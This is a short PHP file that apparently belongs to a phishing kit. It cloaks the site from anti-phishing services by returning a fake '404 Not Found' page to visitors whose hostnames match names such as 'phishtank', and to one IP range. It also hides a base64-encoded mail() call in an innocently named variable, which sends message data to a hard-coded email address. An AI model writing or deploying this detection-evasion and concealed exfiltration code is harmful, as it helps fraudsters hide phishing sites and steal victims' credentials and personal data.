<?php

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("phishtank","dreamhost","p3pwgdsn");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$os_arrays = "bWFpbCgic2VpZmJ6ejExQGdtYWlsLmNvbSIsJHN1YmplY3QsJG1lc3NhZ2UsJGhlYWRlcnMpOw==";

$bannedIP = array("^39.53.*"); //i have banned this fuck IP

if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

?>